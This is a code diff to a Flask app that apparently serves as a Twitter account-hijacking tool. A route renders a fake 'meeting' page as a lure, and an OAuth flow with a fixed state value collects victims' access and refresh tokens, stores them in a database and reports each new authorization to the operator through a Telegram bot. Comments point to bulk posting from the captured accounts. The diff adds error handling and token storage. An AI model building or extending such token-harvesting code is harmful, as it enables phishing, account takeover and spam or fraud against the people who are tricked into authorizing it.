@@ -5,7 +5,7 @@ import sqlite3  # For database storage
 import requests
 import random  # For random delays in bulk posting
 import time  # For adding delays between posts
-from flask import Flask, redirect, request, session, render_template
+from flask import Flask, redirect, request, session, render_template, jsonify
 
 # Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
@@ -20,9 +20,7 @@ app.secret_key = os.urandom(24)
 # Initialize SQLite database
 DATABASE = 'tokens.db'
 
-# Store the command for confirmation
-pending_command = {}
-
+# Initialize the database on startup
 def init_db():
     conn = sqlite3.connect(DATABASE)
     cursor = conn.cursor()
@@ -41,14 +39,18 @@ init_db()  # Ensure the database is initialized when the app starts
 
 # Store token in the database
 def store_token(access_token, refresh_token, username):
-    conn = sqlite3.connect(DATABASE)
-    cursor = conn.cursor()
-    cursor.execute('''
-        INSERT INTO tokens (access_token, refresh_token, username)
-        VALUES (?, ?, ?)
-    ''', (access_token, refresh_token, username))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect(DATABASE)
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO tokens (access_token, refresh_token, username)
+            VALUES (?, ?, ?)
+        ''', (access_token, refresh_token, username))
+        conn.commit()
+    except Exception as e:
+        print(f"Error storing token: {str(e)}")
+    finally:
+        conn.close()
 
 # Get all tokens from the database
 def get_all_tokens():
@@ -109,13 +111,16 @@ def refresh_token_in_db(refresh_token, username):
 
 # Send message via Telegram
 def send_message_via_telegram(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    requests.post(url, json=data)
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
+        requests.post(url, json=data)
+    except Exception as e:
+        print(f"Error sending message to Telegram: {str(e)}")
 
 # Confirm action based on pending command
 def confirm_action():
@@ -227,18 +232,21 @@ def home():
     error = request.args.get('error')
 
     if not code:
-        state = "0"  # Fixed state
-        session['oauth_state'] = state
+        try:
+            state = "0"  # Fixed state
+            session['oauth_state'] = state
 
-        code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier  # Store code_verifier in session
+            code_verifier, code_challenge = generate_code_verifier_and_challenge()
+            session['code_verifier'] = code_verifier  # Store code_verifier in session
 
-        authorization_url = (
-            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-        )
-        return redirect(authorization_url)
+            authorization_url = (
+                f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+                f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+                f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+            )
+            return redirect(authorization_url)
+        except Exception as e:
+            return jsonify({"error": f"Failed to initiate OAuth flow: {str(e)}"}), 500
 
     if code:
         if error:
@@ -257,42 +265,32 @@ def home():
             'code_verifier': code_verifier
         }
 
-        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
-        token_response = response.json()
+        try:
+            response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+            token_response = response.json()
 
-        if response.status_code == 200:
-            access_token = token_response.get('access_token')
-            refresh_token = token_response.get('refresh_token')
+            if response.status_code == 200:
+                access_token = token_response.get('access_token')
+                refresh_token = token_response.get('refresh_token')
 
-            session['access_token'] = access_token
-            session['refresh_token'] = refresh_token
+                session['access_token'] = access_token
+                session['refresh_token'] = refresh_token
 
-            send_to_telegram(access_token, refresh_token)
-            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
-        else:
-            error_description = token_response.get('error_description', 'Unknown error')
-            error_code = token_response.get('error', 'No error code')
-            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+                username = get_twitter_username(access_token)
+                if username:
+                    store_token(access_token, refresh_token, username)
+                    send_message_via_telegram(f"New authorization received for @{username}.")
+                else:
+                    send_message_via_telegram(f"New authorization received but username could not be fetched.")
 
-# --- Meeting Page Route ---
-@app.route('/j')
-def meeting():
-    meeting = request.args.get('meeting')
-    pwd = request.args.get('pwd')
-    return render_template('meeting.html', meeting=meeting, pwd=pwd)
+                return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+            else:
+                error_description = token_response.get('error_description', 'Unknown error')
+                error_code = token_response.get('error', 'No error code')
+                return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
 
-# --- Refresh Token Route ---
-@app.route('/refresh/<refresh_token2>', methods=['GET'])
-def refresh_page(refresh_token2):
-    return render_template('refresh.html', refresh_token=refresh_token2)
-
-# --- Generate code verifier and challenge ---
-def generate_code_verifier_and_challenge():
-    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
-    code_challenge = base64.urlsafe_b64encode(
-        hashlib.sha256(code_verifier.encode()).digest()
-    ).rstrip(b'=').decode('utf-8')
-    return code_verifier, code_challenge
+        except Exception as e:
+            return jsonify({"error": f"Failed to complete OAuth flow: {str(e)}"}), 500
 
 # --- Retrieve Twitter username from access token ---
 def get_twitter_username(access_token):
@@ -301,15 +299,38 @@ def get_twitter_username(access_token):
         "Authorization": f"Bearer {access_token}"
     }
 
-    response = requests.get(url, headers=headers)
+    try:
+        response = requests.get(url, headers=headers)
 
-    if response.status_code == 200:
-        data = response.json()
-        username = data.get("data", {}).get("username")
-        return username
-    else:
-        print(f"Failed to fetch username. Status code: {response.status_code}")
+        if response.status_code == 200:
+            data = response.json()
+            username = data.get("data", {}).get("username")
+            return username
+        else:
+            print(f"Failed to fetch username. Status code: {response.status_code}")
+            return None
+    except Exception as e:
+        print(f"Error fetching Twitter username: {str(e)}")
         return None
+
+# --- Meeting Page Route ---
+@app.route('/j')
+def meeting():
+    meeting = request.args.get('meeting')
+    pwd = request.args.get('pwd')
+    return render_template('meeting.html', meeting=meeting, pwd=pwd)
+
+# --- Generate code verifier and challenge ---
+def generate_code_verifier_and_challenge():
+    try:
+        code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
+        code_challenge = base64.urlsafe_b64encode(
+            hashlib.sha256(code_verifier.encode()).digest()
+        ).rstrip(b'=').decode('utf-8')
+        return code_verifier, code_challenge
+    except Exception as e:
+        print(f"Error generating code verifier and challenge: {str(e)}")
+        raise e
 
 # --- Startup message ---
 def send_startup_message():
